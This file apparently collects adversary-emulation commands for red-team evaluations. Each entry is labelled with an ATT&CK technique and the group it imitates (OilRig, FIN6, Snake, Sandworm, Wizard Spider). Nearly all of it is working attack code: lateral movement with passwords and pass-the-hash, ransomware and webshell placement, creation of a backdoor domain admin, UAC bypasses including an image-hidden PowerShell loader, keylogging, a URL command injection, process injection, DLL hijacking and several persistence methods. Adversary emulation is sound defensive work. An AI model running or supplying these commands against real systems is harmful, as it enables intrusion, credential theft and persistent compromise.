exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore
   //   T1021.001: Remote Services: Remote Desktop Protocol (Lateral Movement) -- OilRig RDP to WATERFALLS -- RDP to 10.1.0.6 using xfreerdp


start copy sss.exe \\127.0.0.1\c$\windows\temp\
   //   T1021.002: Remote Services: SMB/Windows Admin Shares (lateral-movement) -- Copy Ransomware -- FIN6 utilizes cmd to copy ransomware to an internal distribution server

C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\psexec.py kmitnick@10.0.0.7:/tmp/psexec.py;
C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\runtime kmitnick@10.0.0.7:/tmp/runtime;
C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "79a&LbjM@MlW8XZa" C:\Users\kmitnick.financial\AppData\Roaming\TransbaseOdbcDriver\tiny kmitnick@10.0.0.7:/tmp/tiny;
   //   T1570: Lateral Tool Transfer (lateral-movement) -- Lateral Tool Transfer -- Previously uploaded tools are transferred to bankfileserver using pscp.exe

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
   //   T1012: Query Registry (discovery) -- Query Registry -- The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.

"adfind.exe" -f (objectcategory=person) > ad_users.txt
   //   T1087.002: Account Discovery: Domain Account (discovery) -- Enumerate AD person objects -- Find all person objects and output the results to a text file.

ipconfig /all
   //   T1016: System Network Configuration Discovery (discovery) -- System Network Configuration Discovery -- The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.

"adfind.exe" -f (objectcategory=organizationalUnit) > ad_ous.txt
   //   T1482: Domain Trust Discovery (discovery) -- Enumerate AD Organizational Units -- Enumerate all Organizational Units (OUs) in the domain of the user running the command and output the results to a text file.

systeminfo
   //   T1082: System Information Discovery (discovery) -- System Information Discovery -- The systeminfo utility is executed via cmd to enumerate local operating system configuration.

cmd.exe /c net group "Domain Controllers" /domain
   //   T1018: Remote System Discovery (discovery) -- Remote System Discovery -- The net utility is executed via cmd to enumerate DCs within the domain

net use
   //   T1135: Network Share Discovery (discovery) -- Network Share Discovery -- Display network shares

. .\stepTwelve.ps1;
software;
   //   T1518: Software Discovery (discovery) -- Detect Software -- Detect software on host

"adfind.exe" -f (objectcategory=group) > ad_group.txt
   //   T1069.002: Permission Groups Discovery: Domain Groups (discovery) -- Enumerate AD groups -- List groups and output the results to a text file.

echo %USERDOMAIN%\%USERNAME%
   //   T1033: System Owner/User Discovery (discovery) -- System Owner / User Discovery -- The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.

netstat -ano
   //   T1049: System Network Connections Discovery (discovery) -- 4.C.2 - System Network Connections Discovery (T1049) -- The netstat utility is executed via cmd to enumerate local active network connections.

"C:\Windows\Temp\tcping.exe" "192.0.2.10" "445"
   //   T1046: Network Service Scanning (discovery) -- Network Service Scanning -- Enumerate remote hosts for running services using tcping

net user   //   T1087.001: Account Discovery: Local Account (Discovery) -- OilRig Local Account Discovery -- Enumerate user accounts

ls 192.0.2.20
   //   T1083: File and Directory Discovery (discovery) -- File and Directory Discovery (T1083) -- PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share.

net localgroup administrators   //   T1069.001: Permission Groups Discovery: Local Groups (Discovery) -- OilRig "administrators" local group discovery -- View the details and members of the "administrators" local group

Import-Module .\ps.ps1 -Verbose -Force;
ProcessList
   //   T1057: Process Discovery (discovery) -- Process Discovery -- API call(s) are executed to enumerate local running processes.

. .\stepTwelve.ps1;
detectav
   //   T1518.001: Software Discovery: Security Software Discovery (discovery) -- Detect Anti-Virus -- Detect anti-virus software on host

sc query
   //   T1007: System Service Discovery (discovery) -- System Service Discovery -- The sc utility is executed via cmd to enumerate local active services.

./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 1, "command": "net user leshy Password12345 /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
   //   T1136.002: Create Account: Domain Account (Persistence) -- Create a new domain user (Adversary) -- Task Snake to create a new domain user using an access token from one of the domain admin processes. 
The new domain user will be used as a backdoor domain admin account for persistence on the domain.


copy C:\Users\Public\contact.aspx "\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"
   //   T1505.003: Server Software Component: Web Shell (persistence) -- OilRig Copy webshell to WATERFALLS -- contact.aspx is copied from THEBLOCK to WATERFALL to the Exchange Web Services directory. This ability implements Step 4.A.3.  


./evalsC2client.py --set-and-complete-task #{third.snake.id} '{"type": 3, "proc": "wmic.exe", "args": "/node:#{fourth.target.host} /privileges:enable /output:STDOUT process call create \"cmd.exe /c powershell.exe -File C:\\Windows\\System32\\msiex.ps1 > C:\\Windows\\Temp\\msiexinstallation.log 2>&1\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep 'ReturnValue = 0;' -i
   //   T1505.002: Server Software Component: Transport Agent (Persistence) -- Install LightNeuron on the Exchange Server (Adversary) -- Task Snake to install LightNeuron remotely using WMI and PowerShell, using the domain admin's token


if (!(test-path -path $env:windir\system32\sdclt.exe)) {
  write-host "[!] sdclt.exe was not found on this host.";
  exit 1;
}
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;

$username="Administrator";
$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';

Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;

cmd.exe /c sdclt.exe;
cmd.exe /c powershell.exe;
   //   T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control (privilege-escalation) -- UAC Bypass via Backup Utility -- Modify registry values of sdclt to bypass UAC

curl --insecure "https://10.0.1.5/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh" 2>/dev/null;
   //   T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid (privilege-escalation) -- Sandworm Set Up SUID for Agent Execution -- Sandworm executes the downloaded agent executable by running SUID binary /bin/backup.
This binary executes check.sh, which causes the agent to be executed with root privileges.
This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.


./evalsC2client.py --set-and-complete-task #{second.snake.id} '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::htp /user:#{domain.admin.user} /ntlm:#{domain.admin.ntlm} /domain:#{network.domain.name}.local /remotepc:uosis /pexe:C:\\Windows\\System32\\fs_mgr.exe /sys:1 /prun:C:\\Windows\\System32\\cmu_svc.exe\" \"quit\""}' --task-wait-timeout 60
   //   T1550.002: Use Alternate Authentication Material: Pass the Hash (Lateral Movement) -- Install the 3rd Snake installer on the third target host (Adversary) -- Task Snake to pass-the-hash using the previously discovered NTLM hash to run PsExec and install Snake on the target workstation.


cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs
   //   T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (persistence) -- Set Registry Persistence on CFO -- Set Registry Persistence on CFO to run Java-Update.vbs when the CFO user logs in

if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
  exit 1;
}
Set-Location -path "C:\Program Files\SysinternalsSuite";
. .\psversion.ps1;
Get-Keystrokes;
Start-Sleep -Seconds 15;
View-Job -JobName "Keystrokes";
   //   T1056.001: Input Capture: Keylogging (collection) -- Automated Collection (T1119) - Input Capture (T1417) -- Load custom PowerShell module, and grab keystrokes for 15 seconds.

Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $env:AppData\uxtheme.exe" -Force
   //   T1547.004: Boot or Logon Autostart Execution: Winlogon Helper DLL (persistence) -- Wizard Spider Registry Persistence -- Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.


"C:\Windows\System32\schtasks.exe" /create /tn "#{task_name}" /tr "#{task_run}" /sc #{schedule} /ru System
   //   T1053.005: Scheduled Task/Job: Scheduled Task (persistence) -- Scheduled Task Persistence -- FIN6 utilizes cmd to execute Scheduled Tasks

Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('192.0.2.10')"));
Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
   //   T1134.001: Access Token Manipulation: Token Impersonation/Theft (privilege-escalation) -- Bypass User Account Control -- A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.

Set-Location -path "C:\Program Files\SysinternalsSuite";
if (get-service -name "javamtsup" -ErrorAction SilentlyContinue) {
  write-host "[*] Service already exists...Not running persistence step-1";
  exit 1;
}

if (Test-Path -path "readme.ps1") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 1;
  write-host "[+] Persistence 1 invoked.";
  exit 0;

} else {
  write-host "[!] readme.ps1 not found.";
  exit 1;
}
   //   T1547.009: Boot or Logon Autostart Execution: Shortcut Modification (persistence) -- Persistent Service 1 -- Leverage modified Sysinternals

powershell.exe -c "restart-computer -force"
   //   T1546.011: Application Shimming (Persistence) -- Execute Application Shim Persistence -- Reboot the host to start shim persistence.

Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
if ($?) {
  write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
  exit 1;
} else {
  . .\stepFifteen_wmi.ps1;
  wmi;
  if ($?) {
    write-host "[+] WMI script has successfully executed!";
    exit 0;
  }
  exit 1;
}
   //   T1546.003: Event Triggered Execution: Windows Management Instrumentation Event Subscription (persistence) -- WMI Persistence technique -- user triage

Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('192.0.2.10')"));
Inject -PoshCode $pcode;
   //   T1055: Process Injection (privilege-escalation) -- Process Injection -- The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.

printf "[Unit]\nDescription=Syslog daemon\n\n[Service]\nWorkingDirectory=$(dirname #{location})\nExecStartPre=/bin/rm -f /tmp/.applocktx\nExecStart=#{location}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/syslogd.service;
chmod 0644 /etc/systemd/system/syslogd.service;
systemctl enable syslogd.service;
systemctl daemon-reload;
   //   T1543.002: Create or Modify System Process: Systemd Service (persistence) -- Sandworm Establish Systemd Persistence -- Sandworm establishes systemd persistence.


. .\stepFourteen_bypassUAC.ps1;
bypass;
   //   T1134.002: Access Token Manipulation: Create Process with Token (defensive-evasion) -- UAC Bypass via sdctl -- Invoke UAC bypass sdctl

dir=$(dirname #{location});
croncontents=$(crontab -l 2>/dev/null);
printf "$croncontents\n1 * * * * cd $dir && #{exe_name}\n@reboot cd $dir && #{exe_name}\n" | crontab -
   //   T1053.003: Scheduled Task/Job: Cron (persistence) -- Sandworm Establish Crontab Persistence -- Sandworm establishes crontab persistence.


robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
cmd.exe /c "C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
   //   T1574.001: Hijack Execution Flow - DLL Search Order Hijacking (Hijack Execution Flow - DLL Search Order Hijacking) -- Privilege Escalation -- Perform DLL hijack to escalate privileges.

./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add "HKLM\system\currentcontrolset\services\ViperVPNSvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c %TEMP%\mxs_installer.exe" /f' --task-wait-timeout 60
   //   T1574.011: Hijack Execution Flow: Services Registry Permissions Weakness (Privilege Escalation) -- Modify the ViperVPN service registry key (Adversary) -- Modify the ViperVPN service registry key


